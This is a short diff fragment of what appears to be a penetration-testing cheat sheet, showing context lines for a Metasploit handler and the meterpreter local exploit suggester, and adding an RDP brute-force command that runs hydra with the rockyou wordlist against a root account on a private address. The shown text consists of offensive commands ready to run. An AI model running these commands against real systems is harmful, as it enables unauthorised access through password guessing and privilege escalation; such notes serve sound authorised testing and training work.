@@ -117,6 +117,8 @@ msf> use exploit/multi/handler
 # privesc metasploit  
 meterpreter > run post/multi/recon/local_exploit_suggester  
 
+# RDP bruteforce  
+hydra -t 4 -V -l root -P /usr/share/wordlists/rockyou.txt rdp://192.168.x.x  
 
 ### Bash ###   
 # replace
